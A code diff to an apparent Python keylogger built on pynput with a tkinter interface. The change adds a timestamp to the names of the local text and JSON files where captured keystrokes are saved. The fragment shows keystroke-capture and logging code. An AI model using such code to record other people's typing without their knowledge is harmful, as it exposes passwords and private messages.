@@ -6,6 +6,7 @@ from tkinter import Button as _Button
 from tkinter import Label as _Label
 from pynput import keyboard as _keyboard
 from typing import Any as _Any
+from datetime import datetime
 
 import json as _json
 
@@ -13,6 +14,7 @@ import json as _json
 keys_used: list = []
 flag: bool = False
 keys: str = ""
+now =datetime.now()
 
 
 def generate_text_log(key: _Any) -> None:
@@ -23,7 +25,7 @@ def generate_text_log(key: _Any) -> None:
         key (Any): The keystroke data to write into the log file.
     """
     
-    with open("./out/key_log.txt", "w+") as KEYS:
+    with open(f"./out/key_log{now}.txt", "w+") as KEYS:
         KEYS.write(key)
 
 
@@ -35,7 +37,7 @@ def generate_json_file(used_keys: _Any) -> None:
         used_keys (Any): A list of key events to log in JSON format.
     """
     
-    with open("./out/key_log.json", "+wb") as key_log:
+    with open(f"./out/key_log{now}.json", "+wb") as key_log:
         key_list_bytes = _json.dumps(used_keys).encode()
         key_log.write(key_list_bytes)
 
